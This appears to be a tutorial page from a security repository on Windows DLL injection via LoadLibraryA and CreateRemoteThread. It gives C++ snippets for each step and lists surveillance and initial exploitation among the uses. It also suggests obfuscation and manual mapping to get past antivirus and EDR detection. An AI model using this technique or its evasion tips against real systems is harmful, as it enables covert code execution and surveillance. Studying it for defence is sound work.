# DLL Injection via LoadLibrary + CreateRemoteThread

---

## Overview

This technique injects a DLL into a remote process by writing the path to the DLL into the target's memory and launching a remote thread that calls `LoadLibraryA`. It’s one of the oldest and most widely used injection methods on Windows.

---

## When and Why to Use

LoadLibrary-based DLL injection is simple, stable, and compatible across all modern Windows versions. It’s commonly used to:

- Execute arbitrary code inside another process  
- Hook or modify application behavior  
- Load instrumentation or surveillance tools  
- Establish initial access before switching to stealthier methods

Despite being well-known and often monitored by security tools, it remains a solid choice for prototyping, learning, and initial exploitation.

---

## Step-by-Step Breakdown

### 1. Get the Target Process ID

```cpp
DWORD pid;
std::cin >> pid;
```

The injector prompts for the Process ID (PID) of the target. This can be retrieved using Task Manager, Process Explorer, or programmatically via snapshot APIs.

---

### 2. Open the Target Process

```cpp
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
```

The handle must be opened with access rights for:

- Memory allocation (`PROCESS_VM_OPERATION`)
- Memory writing (`PROCESS_VM_WRITE`)
- Thread creation (`PROCESS_CREATE_THREAD`)

On protected or higher-privileged processes, administrator rights may be required.

---

### 3. Allocate Memory for the DLL Path

```cpp
LPVOID remoteMemory = VirtualAllocEx(
    hProcess, nullptr, dllPath.length() + 1,
    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

Allocates space inside the remote process to hold the DLL path as a null-terminated string. The memory must be writable so it can be populated with the path.

---

### 4. Write the DLL Path into Remote Memory

```cpp
WriteProcessMemory(hProcess, remoteMemory,
                   dllPath.c_str(), dllPath.length() + 1, nullptr);
```

This copies the DLL path string into the allocated memory space. The path must be absolute and null-terminated to be interpreted correctly by `LoadLibraryA`.

---

### 5. Resolve Address of LoadLibraryA

```cpp
FARPROC loadLibraryAddr = GetProcAddress(
    GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
```

Since `kernel32.dll` is loaded in nearly every process, its base address is available. `GetProcAddress` retrieves the address of `LoadLibraryA`, which will serve as the entry point for the new remote thread.

---

### 6. Create the Remote Thread

```cpp
HANDLE hThread = CreateRemoteThread(
    hProcess, nullptr, 0,
    (LPTHREAD_START_ROUTINE)loadLibraryAddr,
    remoteMemory, 0, nullptr);
```

This creates a thread inside the target process. The thread will call `LoadLibraryA` using the address of the DLL path we wrote earlier. This causes the target process to load the DLL and execute its `DllMain`.

---

### (Optional) 7. Wait for Completion

```cpp
WaitForSingleObject(hThread, INFINITE);
```

Used if you want to ensure the thread completes before continuing execution. Useful in debugging or post-injection validation.

---

## API Summary

| Function              | Description                              |
|-----------------------|------------------------------------------|
| `OpenProcess`         | Obtain a handle to the target process    |
| `VirtualAllocEx`      | Allocate memory in the target process    |
| `WriteProcessMemory`  | Write data (DLL path) into that memory   |
| `GetProcAddress`      | Resolve the address of `LoadLibraryA`    |
| `CreateRemoteThread`  | Start a thread in the target process     |

---

## Security Considerations

- User Account Control (UAC) may block access to higher-privileged processes  
- Anti-virus and EDR systems often monitor calls to `CreateRemoteThread` and suspicious DLL loads  
- Some applications validate loaded DLLs or restrict from loading non-whitelisted libraries

For stealth, consider combining with DLL proxying, path obfuscation, or transitioning to more advanced techniques such as reflective DLL injection or manual mapping.

---

## Educational Value

Understanding this technique builds a foundation in:

- Windows process memory layout  
- Inter-process communication and API usage  
- DLL loading mechanics  
- Remote thread execution in user-mode

This method is an essential step before moving on to more advanced payload delivery methods such as manual DLL mapping or shellcode injection.

---

## Source Code

See [`../src/injection_dll_loadlibrary.cpp`](../src/injection_dll_loadlibrary.cpp) for the full implementation.
